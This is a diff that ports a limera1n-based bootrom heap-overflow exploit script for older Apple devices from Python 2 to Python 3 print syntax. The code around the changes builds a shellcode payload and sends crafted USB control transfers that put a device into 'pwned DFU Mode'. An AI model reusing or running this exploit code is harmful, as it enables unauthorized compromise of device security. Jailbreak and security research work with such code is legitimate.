@@ -142,7 +142,7 @@ def create_control_transfer(device, request, timeout):
 
 def limera1n_libusb1_async_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex, data, timeout):
     if usb.backend.libusb1._lib is not device._ctx.backend.lib:
-        print 'ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting.'
+        print('ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting.')
         sys.exit(1)
 
     request = array.array('B', struct.pack('<BBHHH', bmRequestType, bRequest, wValue, wIndex, len(data)) + data)
@@ -171,13 +171,13 @@ def generate_payload(constants, exploit_lr):
     return heap_block * 16 + shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants)
 
 def exploit():
-    print '*** based on limera1n exploit (heap overflow) by geohot ***'
+    print('*** based on limera1n exploit (heap overflow) by geohot ***')
 
     device = dfu.acquire_device()
-    print 'Found:', device.serial_number
+    print('Found:', device.serial_number)
 
     if 'PWND:[' in device.serial_number:
-        print 'Device is already in pwned DFU Mode. Not executing exploit.'
+        print('Device is already in pwned DFU Mode. Not executing exploit.')
         return
     
     chosenConfig = None
@@ -188,10 +188,10 @@ def exploit():
     if chosenConfig is None:
         for config in configs:
             if 'CPID:%s' % config.cpid in device.serial_number:
-                print 'ERROR: CPID is compatible, but serial number string does not match.'
-                print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'
+                print('ERROR: CPID is compatible, but serial number string does not match.')
+                print('Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.')
                 sys.exit(1)
-        print 'ERROR: Not a compatible device. This exploit is for S5L8920/S5L8922/S5L8930 devices only. Exiting.'
+        print('ERROR: Not a compatible device. This exploit is for S5L8920/S5L8922/S5L8930 devices only. Exiting.')
         sys.exit(1)
     
     dfu.send_data(device, generate_payload(chosenConfig.constants, chosenConfig.exploit_lr))
@@ -202,7 +202,7 @@ def exploit():
 
     try:
         device.ctrl_transfer(0x21, 2, 0, 0, 0, 10)
-        print 'ERROR: This request succeeded, but it should have raised an exception. Exiting.'
+        print('ERROR: This request succeeded, but it should have raised an exception. Exiting.')
         sys.exit(1)
     except usb.core.USBError:
         # OK: This request should have raised USBError.
@@ -222,7 +222,7 @@ def exploit():
     dfu.release_device(device)
 
     if failed:
-        print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'
+        print('ERROR: Exploit failed. Device did not enter pwned DFU Mode.')
         sys.exit(1)
 
-    print 'Device is now in pwned DFU Mode.'
+    print('Device is now in pwned DFU Mode.')
